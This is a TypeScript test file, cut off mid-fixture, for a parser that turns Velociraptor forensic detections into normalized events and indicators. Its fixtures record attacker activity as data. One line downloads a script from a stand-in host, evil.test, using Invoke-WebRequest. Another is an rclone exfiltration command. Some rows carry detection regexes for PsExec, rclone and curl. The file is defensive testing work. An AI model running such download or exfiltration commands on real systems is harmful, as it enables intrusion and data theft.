import { describe, it, expect } from "vitest";
import { parseVelociraptorJson } from "../../src/analysis/velociraptorImport.js";

// ── A Velociraptor Sigma detection row (parsed evtx event + matched rule).
function sigmaRow(): object {
  return {
    _Source: "Windows.Detection.Sigma",
    Rule: { Title: "Mimikatz LSASS Access", Level: "critical", Tags: ["attack.t1003.001"] },
    System: { EventID: 10, Channel: "Microsoft-Windows-Sysmon/Operational", Computer: "DC01", TimeCreated: "2023-03-01T10:00:00Z" },
    EventData: { TargetImage: "C:\\Windows\\System32\\lsass.exe", SourceImage: "C:\\temp\\mimikatz.exe" },
  };
}

// ── A Velociraptor YARA detection row (file glob scan).
function yaraRow(): object {
  return {
    _Source: "Windows.Detection.Yara.Glob",
    Rule: "APT_Malware_Foo",
    Namespace: "default",
    Meta: { author: "x", mitre: "T1059" },
    Strings: ["$a"],
    OSPath: "C:\\Users\\bob\\evil.exe",
    HashSHA256: "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
  };
}

// ── A Velociraptor parsed-evtx row (no detection) — EventID as a {Value} object.
function eventlogRow(): object {
  return {
    _Source: "Windows.EventLogs.Evtx",
    System: { EventID: { Value: 4624 }, Channel: "Security", Computer: "WS05", TimeCreated: "2023-03-01T08:00:00Z" },
    EventData: { TargetUserName: "alice", TargetDomainName: "CORP", IpAddress: "10.0.0.20", LogonType: "3" },
  };
}

// ── A Velociraptor netstat row — now routed through mapNetstat.
function netstatRow(): object {
  return {
    _Source: "Windows.Network.Netstat",
    Pid: 4321,
    Name: "evil.exe",
    Path: "C:\\temp\\evil.exe",
    Raddr: "8.8.8.8",
    Status: "ESTABLISHED",
    _ts: 1677662400,
  };
}

describe("parseVelociraptorJson — detection rows", () => {
  it("maps a Sigma row verdict-first over the parsed evtx event", () => {
    const r = parseVelociraptorJson(JSON.stringify([sigmaRow()]));
    expect(r.detections).toBe(1);
    expect(r.events).toHaveLength(1);
    const e = r.events[0];
    expect(e.description).toContain("Sigma: Mimikatz LSASS Access"); // artifact tag may precede "Sigma:"
    expect(e.description).toContain("[Windows.Detection.Sigma]");    // source artifact surfaced
    expect(e.description).toContain("EID 10");          // the underlying event is still mapped
    expect(e.severity).toBe("Critical");                // Sigma critical ≥ the EVTX-derived High
    expect(e.mitreTechniques).toContain("T1003.001");
    expect(e.asset).toBe("DC01");
    expect(e.sources).toEqual(["Velociraptor"]);
  });

  it("maps a YARA row as a High detection with rule, path and hash", () => {
    const r = parseVelociraptorJson(JSON.stringify([yaraRow()]));
    expect(r.detections).toBe(1);
    const e = r.events[0];
    expect(e.description).toContain("YARA: APT_Malware_Foo"); // artifact tag may precede "YARA:"
    expect(e.severity).toBe("High");
    expect(e.path).toBe("C:\\Users\\bob\\evil.exe");
    expect(e.sha256).toBe("aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899");
    expect(e.mitreTechniques).toContain("T1059"); // from rule Meta
    expect(r.iocs.find((i) => i.type === "file")?.value).toBe("C:\\Users\\bob\\evil.exe");
    expect(r.iocs.some((i) => i.type === "hash")).toBe(true);
  });
});

describe("parseVelociraptorJson — artifactName provenance", () => {
  // Every mapped event must carry artifactName = the VQL artifact that produced it, so downstream
  // (dwell-time window, evidence graph) can tell "from the MFT" apart from "a Sigma detection".
  it("persists the VQL artifact name onto each mapped event (artifactName)", () => {
    // A multi-artifact map exercises several mappers at once: a Sigma detection, a YARA hit, and a
    // netstat telemetry row — each event should be stamped with its own source artifact.
    const raw = JSON.stringify({
      "Windows.Detection.Sigma": [sigmaRow()],
      "Windows.Detection.Yara.Glob": [yaraRow()],
      "Windows.Network.Netstat": [netstatRow()],
    });
    const r = parseVelociraptorJson(raw);
    expect(r.events.length).toBeGreaterThan(0);
    // No event lacks provenance.
    expect(r.events.every((e) => typeof e.artifactName === "string" && e.artifactName.length > 0)).toBe(true);
    // And each is stamped with the artifact that actually produced it.
    expect(r.events.some((e) => e.artifactName === "Windows.Detection.Sigma")).toBe(true);
    expect(r.events.some((e) => e.artifactName === "Windows.Detection.Yara.Glob")).toBe(true);
    expect(r.events.some((e) => e.artifactName === "Windows.Network.Netstat")).toBe(true);
  });
});

// Velociraptor data indexed into Elasticsearch, then pushed from Kibana by the extension: rows
// arrive reshaped (dotted keys, `.keyword` multi-fields, the artifact in the `artifact_<name>` index,
// ES doc metadata). normalizeElasticRow should reverse that so the native mappers fire.
describe("parseVelociraptorJson — Elastic-indexed Velociraptor (Kibana push)", () => {
  it("MFT keyword hit → keyword-escalated High detection, dated, DetectRaptor-labeled, Velociraptor source", () => {
    const row = {
      _id: "x1", _index: "artifact_detectraptor_windows_detection_mft", _version: 1,
      "@timestamp": "2026-05-07T16:03:56.000Z",
      "Detection.StringHit": "PsExec.exe",
      "Detection.KeywordRegex": "psexec\\.exe$|psexec64\\.exe$|remcom\\.exe$",
      "Artifact.keyword": "DetectRaptor.Windows.Detection.MFT",
      "SITimestamps.LastRecordChange0x10": "2026-01-28T09:47:39.493Z",
      FlowId: "F.D7U8JESNJITC2",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.detections).toBe(1);
    const e = r.events[0];
    expect(e.severity).toBe("High"); // "psexec" keyword
    expect(e.description).toContain("PsExec.exe");
    expect(e.description).toContain("DetectRaptor MFT detection:");
    expect(e.description).not.toContain("_index");
    expect(e.timestamp).toContain("2026-01-28"); // the artifact's own MFT time, not @timestamp
    expect(e.sources).toEqual(["Velociraptor"]);
  });

  it("EVTX scriptblock row → dated generic event with the Message, Velociraptor source", () => {
    const row = {
      _id: "y1", _index: "artifact_detectraptor_windows_detection_evtx", _version: 1,
      "@timestamp": "2026-05-07T16:31:04.000Z",
      "Detection.Regex": "psexec",
      "EventData.ScriptBlockText": "Creating Scriptblock text (1 of 1): # Copyright 2008, Microsoft Corporation.",
      Message: "Creating Scriptblock text (1 of 1): # Copyright 2008, Microsoft Corporation.",
      "Artifact.keyword": "DetectRaptor.Windows.Detection.Evtx",
    };
    const e = parseVelociraptorJson(JSON.stringify([row])).events[0];
    expect(e.description).toContain("Creating Scriptblock");
    expect(e.description).toContain("DetectRaptor.Windows.Detection.Evtx");
    expect(e.timestamp).toContain("2026-05-07"); // @timestamp fallback
    expect(e.sources).toEqual(["Velociraptor"]);
  });

  it("parses an Elastic Discover CSV export (dotted/.keyword headers, Kibana dates, '-' nulls)", () => {
    const csv = [
      '"@timestamp",Artifact,"Artifact.keyword","Detection.Criticality","Detection.Name","Detection.StringHit",EntryPath,"EntryPath.keyword",_index,_Source',
      '"May 7, 2026 @ 16:31:04.000",DetectRaptor.Windows.Detection.Amcache,DetectRaptor.Windows.Detection.Amcache,Medium,"Execution - PsExec",PsExec.exe,"c:\\tools\\psexec.exe","c:\\tools\\psexec.exe",artifact_detectraptor_windows_detection_amcache,"-"',
    ].join("\n");
    const r = parseVelociraptorJson(csv);
    expect(r.format).toBe("csv");
    expect(r.events).toHaveLength(1);
    const e = r.events[0];
    expect(e.severity).toBe("Medium"); // honors Detection.Criticality over the psexec keyword
    expect(e.description).toContain("Execution - PsExec");
    expect(e.description).toContain("DetectRaptor Amcache detection:");
    expect(e.description).not.toContain("-1"); // "-" cells dropped, not rendered
    expect(e.timestamp).toContain("2026-05-07T16:31:04"); // Kibana "@" date → ISO
    expect(e.sources).toEqual(["Velociraptor"]);
  });

  it("synthesizes the artifact source from the index name when no Artifact field is present", () => {
    const row = {
      _index: "artifact_custom_windows_detection_amcache", "@timestamp": "2026-05-07T16:31:04.000Z",
      "Detection.StringHit": "mimikatz.exe", EntryPath: "c:\\tools\\mimikatz.exe",
    };
    const e = parseVelociraptorJson(JSON.stringify([row])).events[0];
    expect(e.severity).toBe("High"); // mimikatz keyword
    expect(e.description).toContain("custom_windows_detection_amcache"); // index-derived source
    expect(e.sources).toEqual(["Velociraptor"]);
  });

  it("MFT hit on a .yms Sigma-rule filename: keyword match is against the rule itself, not attacker content → Info, no file IOC", () => {
    const row = {
      _Source: "DetectRaptor.Windows.Detection.MFT",
      EventTime: "2026-07-02T12:37:57.1022486Z",
      Detection: "Mimikatz Tools",
      OSPath: "registry_event_cve_2021_1675_mimikatz_printernightmare_drivers.yms",
      Fqdn: "DESKTOP-MNNUHHU.localdomain",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.severity).toBe("Info"); // .yms is a compiled Sigma signature, not the matched target
    expect(e.description).toContain("Mimikatz Tools");
    expect(e.sources).toEqual(["Velociraptor"]);
    expect(r.iocs.some((i) => i.type === "file" && i.value.toLowerCase().endsWith(".yms"))).toBe(false);
  });
});

// DetectRaptor-style "*.Detection.*" artifacts carry the verdict in a `Detection`/`RuleName`
// field rather than a Sigma/YARA `Rule`. These rows have no `_Source`.
describe("parseVelociraptorJson — DetectRaptor detection rows", () => {
  it("named-pipe hit: Detection string + Exe + PipeName → keyword-escalated High, verdict-first", () => {
    const row = {
      EventTime: "2025-03-14T21:25:03Z",
      Detection: "Cobalt Strike: trick_ryuk.profile",
      ProcName: "SearchIndexer.exe",
      Exe: "C:\\Windows\\system32\\SearchIndexer.exe",
      PipeName: "SearchTextHarvester",
      Type: "SysmonCreated",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.detections).toBe(1);
    const e = r.events[0];
    expect(e.description).toContain("Velociraptor detection: Cobalt Strike: trick_ryuk.profile");
    expect(e.description).toContain("ProcName: SearchIndexer.exe");
    expect(e.description).toContain("PipeName: SearchTextHarvester");
    expect(e.severity).toBe("High");           // "cobalt strike" keyword
    expect(e.processName).toBe("SearchIndexer.exe");
    expect(e.sources).toEqual(["Velociraptor"]);
    expect(e.timestamp).toContain("2025-03-14T21:25:03");
    expect(r.iocs.some((i) => i.type === "process" && i.value === "SearchIndexer.exe")).toBe(true);
  });

  it("Evtx detection: verdict object overlaid on the flat per-EID Windows event", () => {
    const row = {
      EventTime: "2025-04-22T11:53:50Z",
      Computer: "WIN11.windomain.local",
      Detection: { Name: "T1567.002-Execution of Exfiltration Programs", EventId: "^(4688)$", Regex: "rclone|megacmd" },
      Channel: "Security",
      EventID: 4688,
      EventData: { NewProcessName: "C:\\Windows\\Temp\\rclone.exe", CommandLine: "rclone copy C:\\data remote:exfil", ParentProcessName: "C:\\Windows\\System32\\cmd.exe" },
      Message: "A new process has been created.",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Velociraptor detection: T1567.002-Execution of Exfiltration Programs");
    expect(e.description).toContain("EID");                       // EVTX event mapping overlaid after the verdict (fields joined by " - ")
    expect(e.mitreTechniques).toContain("T1567.002");            // from the verdict name
    expect(e.asset).toBe("WIN11.windomain.local");
    expect(e.severity === "Medium" || e.severity === "High").toBe(true); // ≥ Medium detection baseline
    expect(e.sources).toEqual(["Velociraptor"]);
  });

  it("GUI-flattened Evtx detection (no Channel/EventData columns): dated, MITRE, Message subject", () => {
    // The Velociraptor GUI's DetectRaptor.*.Evtx table exposes only EventTime/Computer/Detection.Name/
    // EventID/Username/Message — no Channel/EventData to overlay — so this takes the non-event verdict
    // branch. The browser extension un-flattens "Detection.Name" → Detection:{Name} before pushing.
    const row = {
      EventTime: "2026-06-03T08:28:58Z",
      Computer: "WIN11.windomain.local",
      Detection: { Name: "T1567.002-Execution of Exfiltration Programs" },
      EventID: 4688,
      Username: "",
      Message: "A new process has been created. Creator Subject: Security ID: S-1-5-18 New Process Name: rclone.exe",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Velociraptor detection: T1567.002-Execution of Exfiltration Programs");
    expect(e.description).toContain("rclone.exe");  // the actual process surfaced, not boilerplate
    expect(e.timestamp).toContain("2026-06-03T08:28:58");                // EventTime, not undated
    expect(e.mitreTechniques).toContain("T1567.002");
    expect(e.asset).toBe("WIN11.windomain.local");
    expect(e.severity === "Medium" || e.severity === "High").toBe(true);
  });

  it("Windows.Sigma.Base rows with the same Title but different Details stay SEPARATE events", () => {
    // The Velociraptor Sigma artifact puts the message in `Details`; 8 HackTool detections share the
    // rule Title "Antivirus Hacktool Detection" but name different tools — each is its own event.
    const mk = (ts: string, tool: string, id: number) => ({
      _Source: "Windows.Sigma.Base",
      Timestamp: ts, Computer: "WIN11.windomain.local",
      Channel: "Microsoft-Windows-Windows Defender/Operational", EID: 1011, Level: "high",
      Title: "Antivirus Hacktool Detection", RecordID: id,
      Details: `Microsoft Defender Antivirus removed an item from quarantine. name=HackTool:Win32/${tool}&threatid=${id}`,
    });
    const rows = [
      mk("2026-06-03T08:15:40.382Z", "Passview", 2147597639),
      mk("2026-06-03T08:15:40.393Z", "Wirekeyview", 2147657007),
      mk("2026-06-03T08:15:40.417Z", "Mimikatz", 2147686744),
    ];
    const r = parseVelociraptorJson(JSON.stringify(rows));
    expect(r.events).toHaveLength(3);                                  // NOT collapsed into one ×3
    const blob = r.events.map((e) => e.description).join("\n");
    expect(blob).toContain("Passview");
    expect(blob).toContain("Mimikatz");
    expect(r.events.every((e) => /Antivirus Hacktool Detection/.test(e.description))).toBe(true);
    expect(r.events.every((e) => e.timestamp.startsWith("2026-06-03T08:15:40"))).toBe(true);
  });

  it("identical Sigma rows differing only in a volatile id DO still collapse", () => {
    const mk = (pid: number) => ({
      _Source: "Windows.Sigma.Base", Timestamp: "2026-06-03T08:15:40Z", Computer: "WIN11",
      Channel: "Security", EID: 4688, Level: "high", Title: "Suspicious Process",
      Details: `Process created. pid=${pid} name=evil.exe`,
    });
    const r = parseVelociraptorJson(JSON.stringify([mk(101), mk(202), mk(303)]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].count).toBe(3);
  });

  it("surfaces the LOLBIN (New Process Name + Command Line) from a rendered 4688 message", () => {
    // DetectRaptor "Use of 32-bit LOLBINs": EID 4688 shipped as free-text Message, no EventData. The
    // binary that ran is the New Process Name/Command Line, buried past the Creator/Target boilerplate.
    const row = {
      EventTime: "2026-06-03T07:56:16Z", Computer: "WIN11.windomain.local",
      Detection: { Name: "T1567.002-Use of 32-bit LOLBINs" }, EventID: 4688,
      Message: [
        "A new process has been created.", "",
        "Creator Subject:", "\tSecurity ID:\t\tS-1-5-18", "\tAccount Name:\t\tWIN11$", "",
        "Target Subject:", "\tSecurity ID:\t\tS-1-0-0", "\tAccount Name:\t\t-", "",
        "Process Information:",
        "\tNew Process Name:\tC:\\Windows\\SysWOW64\\dllhost.exe!S!",
        "\tProcess Command Line:\t\"C:\\Windows\\SysWOW64\\DllHost.exe\" /Processid:{5250E46F-BB09-D602}!S!",
      ].join("\n"),
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Use of 32-bit LOLBINs");
    expect(e.description).toContain("dllhost.exe");                 // the LOLBIN binary, surfaced
    expect(e.description).toContain("/Processid:");                 // its command line, surfaced
    expect(e.description).not.toContain("Token Elevation Type");    // boilerplate not leading
    expect(e.timestamp).toContain("2026-06-03T07:56:16");
    expect(r.iocs.some((i) => i.type === "process" && i.value === "dllhost.exe")).toBe(true);
  });

  it("names the triggering file (EntryPath) in an Amcache-style detection verdict", () => {
    const row = {
      Detection: { Name: "Defence Evasion", KeywordRegex: "CleanWipe|RULEPAT_MARKER", Criticality: "Medium" },
      KeyMTime: "2026-06-06T20:42:51Z", EntryName: "kprocesshacker.sys",
      EntryPath: "c:\\program files\\process hacker 2\\kprocesshacker.sys", SHA1: "a".repeat(40),
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Defence Evasion");
    expect(e.description).toContain("kprocesshacker.sys");                 // the file that fired the rule
    expect(e.description).not.toContain("RULEPAT_MARKER");                 // the KeywordRegex pattern is kept out
    expect(r.iocs.some((i) => i.type === "file" && i.value.includes("kprocesshacker.sys"))).toBe(true);
  });

  it("surfaces the matched Content of a PSReadline/ISE detection, not just the rule name", () => {
    const row = {
      Detection: { ID: "win_ps_b64", Name: "Powershell large Base64 blob - IN DEVELOPMENT", Regex: "[a-z0-9+/]{44,}", HitString: "Sy1pYktKVUJX" },
      FileInfo: { OSPath: "C:\\Users\\v\\ise.ps1", Mtime: "2026-06-03T08:40:48Z" },
      Content: "download elasticagent from https://www.elastic.co/downloads/elastic-agent",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Powershell large Base64 blob");
    expect(e.description).toContain("elastic.co/downloads");               // the matched content
    expect(e.description).not.toMatch(/\[a-z0-9/);                         // the rule Regex must not leak
    expect(e.severity).toBe("Low");                                        // IN DEVELOPMENT
  });

  it("MFT detection: object verdict with explicit Criticality wins; nested $SI timestamp resolved", () => {
    const row = {
      Detection: { Name: "BAU Cloud Data Transfer", KeywordRegex: "OneDrive\\.exe", Criticality: "Low" },
      OSPath: "\\\\.\\C:\\Users\\vagrant\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
      SITimestamps: { Created0x10: "2021-12-09T17:28:24Z", LastModified0x10: "2026-06-03T08:29:42Z" },
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Velociraptor detection: BAU Cloud Data Transfer");
    expect(e.severity).toBe("Low");                  // explicit Criticality:"Low" wins over the Medium baseline
    expect(e.timestamp).toContain("2026-06-03T08:29:42"); // SITimestamps.LastModified0x10
    expect(e.path).toContain("OneDrive.exe");
  });

  it("PSReadline: RuleName verdict + command Line → Medium, MITRE from the rule name, FileInfo time", () => {
    const row = {
      RuleID: "win_powershell_web",
      RuleName: "T1059.001-PowerShell Web Request",
      Line: "Invoke-WebRequest -Uri https://evil.test/x.ps1 -OutFile a.ps1",
      RuleRegex: "Invoke-WebRequest|iwr |curl ",
      FileInfo: { OSPath: "C:\\Users\\v\\...\\ConsoleHost_history.txt", Mtime: "2026-06-03T08:40:48Z" },
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Velociraptor detection: T1059.001-PowerShell Web Request");
    expect(e.description).toContain("Invoke-WebRequest");
    expect(e.severity).toBe("Medium");
    expect(e.mitreTechniques).toContain("T1059.001");
    expect(e.timestamp).toContain("2026-06-03T08:40:48");   // nested FileInfo.Mtime
    expect(r.iocs.some((i) => i.type === "url" && i.value.includes("evil.test"))).toBe(true);
  });

  it("downgrades an 'IN DEVELOPMENT' rule to Low and keeps the rule regex out of the description", () => {
    const row = {
      Detection: { ID: "win_powershell_encoded_command", Name: "Powershell encoded command - IN DEVELOPMENT", Regex: "[-]e(nc*o*d*e*d*)*\\s+[^-]", HitString: "-enc" },
      FileInfo: { OSPath: "C:\\Users\\v\\AutoSave\\Untitled1.ps1", Mtime: "2025-03-14T21:56:04Z" },
      Content: "elastic-agent.exe install --url=http://192.168.56.50:8220 --insecure",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.severity).toBe("Low");
    expect(e.description).toContain("Powershell encoded command - IN DEVELOPMENT");
    expect(e.description).not.toContain("nc*o*d*e*d");          // the rule Regex must not leak into the description
    expect(r.iocs.some((i) => i.type === "ip" && i.value === "192.168.56.50")).toBe(true); // scraped from Content
  });
});

// ── A Velociraptor artifact that shells out to Chainsaw and streams its rows back as VQL:
// Chainsaw's own flat Sigma-mapping shape (Detection/Severity/Rule Group siblings), NOT
// Velociraptor's DetectRaptor {Detection:{Name,Criticality}} convention. Must NOT be
// misclassified as a generic `detection` row, or the real Severity is lost.
describe("parseVelociraptorJson — Chainsaw rows shelled out via a Velociraptor artifact", () => {
  function chainsawLogClearedRow(): object {
    return {
      _Source: "Custom.Windows.Detection.Chainsaw",
      EventTime: "2026-07-02T09:12:00Z",
      Detection: "Security Audit Logs Cleared",
      Severity: "critical",
      Status: "stable",
      "Rule Group": "Log Tampering",
      Computer: "WIN-UK1GV882OK6",
      Channel: "Security",
      EventID: 1102,
      SystemData: { EventID: 1102, Provider_attributes: { Name: "Microsoft-Windows-Eventlog" }, Computer: "WIN-UK1GV882OK6" },
      EventData: { SubjectUserName: "vagrant", SubjectDomainName: "DESKTOP-MNNUHHU" },
      Authors: ["frack113"],
    };
  }

  it("reads the sibling Severity field instead of guessing from the title keyword", () => {
    const r = parseVelociraptorJson(JSON.stringify([chainsawLogClearedRow()]));
    expect(r.detections).toBe(1);
    const e = r.events[0];
    // A generic DetectRaptor-style read would find no keyword match on "Security Audit Logs
    // Cleared" and default to Medium — this MUST come from the row's own "critical".
    expect(e.severity).toBe("Critical");
    expect(e.description).toContain("Chainsaw/Log Tampering: Security Audit Logs Cleared");
    expect(e.asset).toBe("WIN-UK1GV882OK6");
    expect(e.sources).toEqual(["Chainsaw"]); // corroboration stays keyed to the real tool, not "Velociraptor"
  });

  it("does not confuse a real DetectRaptor bare-string Detection (no EventID) for the flat Chainsaw shape", () => {
    const row = { EventTime: "2025-03-14T21:25:03Z", Detection: "Cobalt Strike: trick_ryuk.profile", Exe: "C:\\x.exe" };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.events[0].description).toContain("Velociraptor detection: Cobalt Strike: trick_ryuk.profile");
    expect(r.events[0].sources).toEqual(["Velociraptor"]);
  });
});

describe("parseVelociraptorJson — IOC hygiene & extra time keys (#102)", () => {
  it("a YARA hit extracts only the matched file — NOT the rule's Meta references / HitContext bytes", () => {
    const row = {
      _Source: "DetectRaptor.Generic.Detection.YaraFile",
      OSPath: "C:\\pagefile.sys", Mtime: "2026-06-12T11:12:41Z",
      Rule: "SUSP_Download_Temp_Rundll",
      Tags: ["POWERSHELL", "DOWNLOAD"],
      Meta: { author: "X", reference: "https://github.com/SIFalcon/Detection", source_url: "https://github.com/x/y.yar", hash: "a".repeat(64) },
      HitContext: "deadbeef" + "b".repeat(64) + " http://rule-example.test/sample",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.iocs.filter((i) => i.type === "file")).toHaveLength(1);
    expect(r.iocs.some((i) => i.type === "file" && i.value.includes("pagefile.sys"))).toBe(true);
    expect(r.iocs.some((i) => i.type === "hash")).toBe(false);   // no Meta/HitContext hashes
    expect(r.iocs.some((i) => i.type === "url")).toBe(false);    // no Meta reference URLs
  });

  it("tags every event type with its source artifact (_Source) so it can be traced back", () => {
    const detection = { _Source: "DetectRaptor.Windows.Detection.LolDrivers", Detection: { Name: "Defence Evasion" }, EntryPath: "c:\\x\\kproc.sys", KeyMTime: "2026-06-06T20:42:51Z" };
    const generic = { _Source: "Windows.Analysis.EvidenceOfDownload", DownloadedFilePath: "C:\\Users\\v\\a.exe", Mtime: "2026-06-03T08:00:00Z" };
    const det = parseVelociraptorJson(JSON.stringify([detection])).events[0];
    const gen = parseVelociraptorJson(JSON.stringify([generic])).events[0];
    // DetectRaptor detections lead with the specific rule-pack name (not the generic "Velociraptor"
    // bucket); other Velociraptor-hosted artifacts still get the bracketed full artifact name.
    expect(det.description).toContain("DetectRaptor LolDrivers detection:");
    expect(gen.description).toContain("Velociraptor [Windows.Analysis.EvidenceOfDownload]:");
    // The filename fallback (no _Source) is NOT shown as a bracketed artifact tag.
    const noSource = parseVelociraptorJson(JSON.stringify([{ Detection: { Name: "X" }, EntryPath: "c:\\y.sys" }]), { artifact: "0036_velociraptor-2026.json" }).events[0];
    expect(noSource.description).not.toContain("[0036_velociraptor");
  });

  it("dates rows via EventTimestamp, KeyMTime, and nested Stat.Mtime", () => {
    const rdp = { _Source: "Custom.RDP", EventTimestamp: "2025-03-14T22:30:42Z", EventID: 4648, Message: "explicit cred logon" };
    const amcache = { _Source: "DetectRaptor.Windows.Detection.Amcache", Detection: { Name: "Defence Evasion" }, KeyMTime: "2026-06-06T20:42:51Z", EntryName: "x.exe" };
    const psr = { _Source: "Windows.System.Powershell.PSReadline", Line: "whoami /all", Stat: { Mtime: "2026-06-03T08:40:48Z" } };
    expect(parseVelociraptorJson(JSON.stringify([rdp])).events[0].timestamp).toContain("2025-03-14T22:30:42");
    expect(parseVelociraptorJson(JSON.stringify([amcache])).events[0].timestamp).toContain("2026-06-06T20:42:51");
    expect(parseVelociraptorJson(JSON.stringify([psr])).events[0].timestamp).toContain("2026-06-03T08:40:48");
  });
});

describe("parseVelociraptorJson — eventlog & generic rows", () => {
  it("maps a parsed-evtx row per-EID, normalizing the {Value} EventID", () => {
    const r = parseVelociraptorJson(JSON.stringify([eventlogRow()]));
    expect(r.detections).toBe(0);
    const e = r.events[0];
    expect(e.description).toContain("EID 4624");
    expect(e.severity).toBe("Low");
    expect(e.asset).toBe("WS05");
    expect(e.sources).toEqual(["Velociraptor"]);
    expect(r.iocs.find((i) => i.type === "ip")?.value).toBe("10.0.0.20");
  });

  it("maps a Windows.Network.Netstat row via mapNetstat (Low for external ESTABLISHED)", () => {
    const r = parseVelociraptorJson(JSON.stringify([netstatRow()]));
    const e = r.events[0];
    expect(e.severity).toBe("Low"); // ESTABLISHED to external IP → Low
    expect(e.description).toContain("evil.exe (pid 4321)");
    expect(e.description).toContain("ESTABLISHED");
    expect(e.description).toContain("8.8.8.8");
    expect(e.processName).toBe("evil.exe");
    expect(e.timestamp).toBe("2023-03-01T09:20:00.000Z"); // _ts epoch seconds → UTC
    expect(r.iocs.find((i) => i.type === "ip")?.value).toBe("8.8.8.8");
    expect(r.iocs.some((i) => i.type === "process" && i.value === "evil.exe")).toBe(true);
  });

  it("prefers the artifact's own time over the _ts collection time", () => {
    const row = { _Source: "Custom.X", EventTime: "2022-01-01T00:00:00Z", _ts: 1677662400, Message: "hi" };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.events[0].timestamp).toBe("2022-01-01T00:00:00Z");
  });

  it("leads a generic registry/app row with Category/KeyPath and reads KeyLastWriteTimestamp", () => {
    const row = { Category: "Data Transfer - OneDrive", KeyName: "OneDriveSetup.exe", DisplayName: "Microsoft OneDrive", KeyLastWriteTimestamp: "2025-04-22T11:42:03Z", KeyPath: "HKEY_USERS\\S-1-5-21\\...\\OneDriveSetup.exe" };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.severity).toBe("Info");
    expect(e.description).toContain("Data Transfer - OneDrive");   // Category leads, not a key=value dump
    expect(e.timestamp).toContain("2025-04-22T11:42:03");
  });

  it("falls back to the supplied artifact label when a row carries no _Source", () => {
    const row = { Category: "OneDrive", KeyLastWriteTimestamp: "2025-04-22T11:42:03Z" };
    const r = parseVelociraptorJson(JSON.stringify([row]), { artifact: "DetectRaptor.Windows.Detection.Applications" });
    expect(r.events[0].description).toContain("[DetectRaptor.Windows.Detection.Applications]");
  });
});

describe("parseVelociraptorJson — inputs, floor & edges", () => {
  it("reads JSONL (native collection results)", () => {
    const text = [JSON.stringify(eventlogRow()), JSON.stringify(yaraRow())].join("\n");
    const r = parseVelociraptorJson(text);
    expect(r.format).toBe("jsonl");
    expect(r.events).toHaveLength(2);
    expect(r.detections).toBe(1);
  });

  it("reads a multi-artifact map { Artifact: [rows] } and tags _Source", () => {
    const yaraNoSource = { Rule: "Bar", Strings: ["$x"], OSPath: "C:\\a.exe" };
    const text = JSON.stringify({ "Windows.Detection.Yara.Glob": [yaraNoSource], "Custom.Other": [{ Message: "x" }] });
    const r = parseVelociraptorJson(text);
    expect(r.format).toBe("artifact-map");
    expect(r.events).toHaveLength(2);
    expect(r.detections).toBe(1); // the yara row classified via the artifact key
  });

  it("applies a minSeverity floor (drops rows below the threshold)", () => {
    const text = JSON.stringify([sigmaRow(), netstatRow()]);
    const r = parseVelociraptorJson(text, { minSeverity: "Medium" });
    expect(r.events).toHaveLength(1); // netstat row is Low → dropped; sigma is Critical → kept
    expect(r.events[0].severity).toBe("Critical");
  });

  it("reports empty for a non-Velociraptor file", () => {
    const r = parseVelociraptorJson("nonsense");
    expect(r.format).toBe("empty");
    expect(r.events).toHaveLength(0);
  });
});

describe("parseVelociraptorJson — pslist/pstree rows (no _Source marker)", () => {
  function pslistRow(overrides: object = {}): object {
    return {
      Pid: "1004",
      Ppid: "592",
      Name: "svchost.exe",
      Username: "NT AUTHORITY\\LOCAL SERVICE",
      Exe: "C:\\Windows\\System32\\svchost.exe",
      CommandLine: "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog",
      StartTime: "2026-06-12T11:12:45.8986623Z",
      EndTime: "0001-01-01T00:00:00Z",
      CallChain: "svchost.exe",
      PSTree: null,
      ...overrides,
    };
  }

  it("uses StartTime as the event timestamp", () => {
    const r = parseVelociraptorJson(JSON.stringify([pslistRow()]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].timestamp).toContain("2026-06-12");
  });

  it("includes process name and CommandLine in description", () => {
    const r = parseVelociraptorJson(JSON.stringify([pslistRow()]));
    const desc = r.events[0].description;
    expect(desc).toContain("svchost.exe");
    expect(desc).toContain("-k LocalServiceNetworkRestricted");
  });

  it("sets processName from the Name field", () => {
    const r = parseVelociraptorJson(JSON.stringify([pslistRow()]));
    expect(r.events[0].processName).toBe("svchost.exe");
  });

  it("falls back to Name in description when CommandLine is empty", () => {
    const r = parseVelociraptorJson(JSON.stringify([pslistRow({ Name: "Registry", Pid: "100", Ppid: "4", Exe: "", CommandLine: "", CallChain: "Registry" })]));
    expect(r.events[0].description).toContain("Registry");
  });

  it("aggregates multiple instances of the same service host together", () => {
    const rows = [pslistRow(), pslistRow({ Pid: "2000" })]; // same cmdline, different PIDs
    const r = parseVelociraptorJson(JSON.stringify(rows));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].count).toBe(2);
  });
});

describe("parseVelociraptorJson — netstat rows (no _Source marker)", () => {
  function netstatRow(overrides: object = {}): object {
    return {
      Pid: 896,
      Ppid: 592,
      Name: "svchost.exe",
      Path: "C:\\Windows\\System32\\svchost.exe",
